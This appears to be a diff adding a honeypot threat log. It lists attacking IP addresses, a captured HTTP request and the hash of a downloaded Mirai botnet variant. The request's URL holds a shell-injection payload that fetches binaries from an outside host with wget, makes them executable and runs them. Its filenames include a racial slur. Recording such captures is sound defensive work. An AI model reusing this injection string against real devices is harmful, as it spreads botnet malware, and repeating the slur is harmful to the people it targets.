@@ -1,0 +1,23 @@
+Top 5 IPs for todays date
+82.223.69.168
+143.198.217.84
+170.64.169.244
+46.19.139.138
+
+
+Top malware list:
+
+(Interesting User Agent: KrebsOnSecurity ) -> For those who don't know Brian Krebs is famous American journalist and investigative reporter. you can read Brian's posts over here->  https://krebsonsecurity.com/
+
+GET /shell?cd+/tmp;rm+gangbang.arm+gangbang.arm7;wget+http://185.150.26. 253/gangbang.arm7;chmod+777+gangbang.arm7;./gangbang.arm7+nigger.arm7;wget+http://185.150.26. 253/gangbang.arm;chmod+777+gangbang.arm;./gangbang.arm+nigger.arm HTTP/1.1
+Host: 3.236.225.100:5500
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+Downloaded sample: 32e024cf2b62249a6d8f9b37238d09c836a17a52e7d3e6a83edca8e90da70a4d
+whihc is a varient of Mirai botnet.
+
